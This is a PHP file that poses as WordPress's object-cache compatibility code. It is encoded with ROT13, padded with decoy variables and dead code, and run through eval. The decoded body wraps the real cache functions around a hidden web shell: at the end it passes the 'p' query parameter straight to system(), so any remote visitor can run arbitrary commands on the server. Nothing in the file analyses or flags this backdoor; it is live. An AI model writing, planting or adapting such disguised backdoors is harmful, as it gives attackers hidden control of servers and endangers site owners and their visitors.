<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Bowrpg Pnpur NCV shapgvbaf zvffvat sebz 3eq cnegl bowrpg pnpurf.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_bowrpg_pnpur/
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Pnpur
 */

vs ( ! shapgvba_rkvfgf( 'jc_pnpur_nqq_zhygvcyr' ) ) :
	/**
	 * Nqqf zhygvcyr inyhrf gb gur pnpur va bar pnyy, vs gur pnpur xrlf qba'g nyernql rkvfg.
	 *
	 * Pbzcng shapgvba gb zvzvp jc_pnpur_nqq_zhygvcyr().
	 *
	 * @vtaber
	 * @fvapr 6.0.0
	 *
	 * @frr jc_pnpur_nqq_zhygvcyr()
	 *
	 * @cnenz neenl  $qngn   Neenl bs xrlf naq inyhrf gb or nqqrq.
	 * @cnenz fgevat $tebhc  Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg rzcgl.
	 * @cnenz vag    $rkcver Bcgvbany. Jura gb rkcver gur pnpur pbagragf, va frpbaqf.
	 *                       Qrsnhyg 0 (ab rkcvengvba).
	 * @erghea obby[] Neenl bs erghea inyhrf, tebhcrq ol xrl. Rnpu inyhr vf rvgure
	 *                gehr ba fhpprff, be snyfr vs pnpur xrl naq tebhc nyernql rkvfg.
	 */
	shapgvba jc_pnpur_nqq_zhygvcyr( neenl $qngn, $tebhc = '', $rkcver = 0 ) {
		$inyhrf = neenl();

		sbernpu ( $qngn nf $xrl => $inyhr ) {
			$inyhrf[ $xrl ] = jc_pnpur_nqq( $xrl, $inyhr, $tebhc, $rkcver );
		}

		erghea $inyhrf;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_pnpur_frg_zhygvcyr' ) ) :
	/**
	 * Frgf zhygvcyr inyhrf gb gur pnpur va bar pnyy.
	 *
	 * Qvssref sebz jc_pnpur_nqq_zhygvcyr() va gung vg jvyy nyjnlf jevgr qngn.
	 *
	 * Pbzcng shapgvba gb zvzvp jc_pnpur_frg_zhygvcyr().
	 *
	 * @vtaber
	 * @fvapr 6.0.0
	 *
	 * @frr jc_pnpur_frg_zhygvcyr()
	 *
	 * @cnenz neenl  $qngn   Neenl bs xrlf naq inyhrf gb or frg.
	 * @cnenz fgevat $tebhc  Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg rzcgl.
	 * @cnenz vag    $rkcver Bcgvbany. Jura gb rkcver gur pnpur pbagragf, va frpbaqf.
	 *                       Qrsnhyg 0 (ab rkcvengvba).
	 * @erghea obby[] Neenl bs erghea inyhrf, tebhcrq ol xrl. Rnpu inyhr vf rvgure
	 *                gehr ba fhpprff, be snyfr ba snvyher.
	 */
	shapgvba jc_pnpur_frg_zhygvcyr( neenl $qngn, $tebhc = '', $rkcver = 0 ) {
		$inyhrf = neenl();

		sbernpu ( $qngn nf $xrl => $inyhr ) {
			$inyhrf[ $xrl ] = jc_pnpur_frg( $xrl, $inyhr, $tebhc, $rkcver );
		}

		erghea $inyhrf;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_pnpur_trg_zhygvcyr' ) ) :
	/**
	 * Ergevrirf zhygvcyr inyhrf sebz gur pnpur va bar pnyy.
	 *
	 * Pbzcng shapgvba gb zvzvp jc_pnpur_trg_zhygvcyr().
	 *
	 * @vtaber
	 * @fvapr 5.5.0
	 *
	 * @frr jc_pnpur_trg_zhygvcyr()
	 *
	 * @cnenz neenl  $xrlf  Neenl bs xrlf haqre juvpu gur pnpur pbagragf ner fgberq.
	 * @cnenz fgevat $tebhc Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg rzcgl.
	 * @cnenz obby   $sbepr Bcgvbany. Jurgure gb sbepr na hcqngr bs gur ybpny pnpur
	 *                      sebz gur crefvfgrag pnpur. Qrsnhyg snyfr.
	 * @erghea neenl Neenl bs erghea inyhrf, tebhcrq ol xrl. Rnpu inyhr vf rvgure
	 *               gur pnpur pbagragf ba fhpprff, be snyfr ba snvyher.
	 */
	shapgvba jc_pnpur_trg_zhygvcyr( $xrlf, $tebhc = '', $sbepr = snyfr ) {
		$inyhrf = neenl();

		sbernpu ( $xrlf nf $xrl ) {
			$inyhrf[ $xrl ] = jc_pnpur_trg( $xrl, $tebhc, $sbepr );
		}

		erghea $inyhrf;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_pnpur_qryrgr_zhygvcyr' ) ) :
	/**
	 * Qryrgrf zhygvcyr inyhrf sebz gur pnpur va bar pnyy.
	 *
	 * Pbzcng shapgvba gb zvzvp jc_pnpur_qryrgr_zhygvcyr().
	 *
	 * @vtaber
	 * @fvapr 6.0.0
	 *
	 * @frr jc_pnpur_qryrgr_zhygvcyr()
	 *
	 * @cnenz neenl  $xrlf  Neenl bs xrlf haqre juvpu gur pnpur gb qryrgrq.
	 * @cnenz fgevat $tebhc Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg rzcgl.
	 * @erghea obby[] Neenl bs erghea inyhrf, tebhcrq ol xrl. Rnpu inyhr vf rvgure
	 *                gehr ba fhpprff, be snyfr vs gur pbagragf jrer abg qryrgrq.
	 */
	shapgvba jc_pnpur_qryrgr_zhygvcyr( neenl $xrlf, $tebhc = '' ) {
		$inyhrf = neenl();

		sbernpu ( $xrlf nf $xrl ) {
			$inyhrf[ $xrl ] = jc_pnpur_qryrgr( $xrl, $tebhc );
		}

		erghea $inyhrf;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_pnpur_syhfu_ehagvzr' ) ) :
	/**
	 * Erzbirf nyy pnpur vgrzf sebz gur va-zrzbel ehagvzr pnpur.
	 *
	 * Pbzcng shapgvba gb zvzvp jc_pnpur_syhfu_ehagvzr().
	 *
	 * @vtaber
	 * @fvapr 6.0.0
	 *
	 * @frr jc_pnpur_syhfu_ehagvzr()
	 *
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	shapgvba jc_pnpur_syhfu_ehagvzr() {
		vs ( ! jc_pnpur_fhccbegf( 'syhfu_ehagvzr' ) ) {
			_qbvat_vg_jebat(
				__SHAPGVBA__,
				__( 'Lbhe bowrpg pnpur vzcyrzragngvba qbrf abg fhccbeg syhfuvat gur va-zrzbel ehagvzr pnpur.' ),
				'6.1.0'
			);

			erghea snyfr;
		}

		erghea jc_pnpur_syhfu();
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_pnpur_syhfu_tebhc' ) ) :
	/**
	 * Erzbirf nyy pnpur vgrzf va n tebhc, vs gur bowrpg pnpur vzcyrzragngvba fhccbegf vg.
	 *
	 * Orsber pnyyvat guvf shapgvba, nyjnlf purpx sbe tebhc syhfuvat fhccbeg hfvat gur
	 * `jc_pnpur_fhccbegf( 'syhfu_tebhc' )` shapgvba.
	 *
	 * @fvapr 6.1.0
	 *
	 * @frr JC_Bowrpg_Pnpur::syhfu_tebhc()
	 * @tybony JC_Bowrpg_Pnpur $jc_bowrpg_pnpur Bowrpg pnpur tybony vafgnapr.
	 *
	 * @cnenz fgevat $tebhc Anzr bs tebhc gb erzbir sebz pnpur.
	 * @erghea obby Gehr vs tebhc jnf syhfurq, snyfr bgurejvfr.
	 */
	shapgvba jc_pnpur_syhfu_tebhc( $tebhc ) {
		tybony $jc_bowrpg_pnpur;

		vs ( ! jc_pnpur_fhccbegf( 'syhfu_tebhc' ) ) {
			_qbvat_vg_jebat(
				__SHAPGVBA__,
				__( 'Lbhe bowrpg pnpur vzcyrzragngvba qbrf abg fhccbeg syhfuvat vaqvivqhny tebhcf.' ),
				'6.1.0'
			);

			erghea snyfr;
		}

		erghea $jc_bowrpg_pnpur->syhfu_tebhc( $tebhc );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_pnpur_fhccbegf' ) ) :
	/**
	 * Qrgrezvarf jurgure gur bowrpg pnpur vzcyrzragngvba fhccbegf n cnegvphyne srngher.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $srngher Anzr bs gur srngher gb purpx sbe. Cbffvoyr inyhrf vapyhqr:
	 *                        'nqq_zhygvcyr', 'frg_zhygvcyr', 'trg_zhygvcyr', 'qryrgr_zhygvcyr',
	 *                        'syhfu_ehagvzr', 'syhfu_tebhc'.
	 * @erghea obby Gehr vs gur srngher vf fhccbegrq, snyfr bgurejvfr.
	 */
	shapgvba jc_pnpur_fhccbegf( $srngher ) {
		erghea snyfr;
	}
raqvs;

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>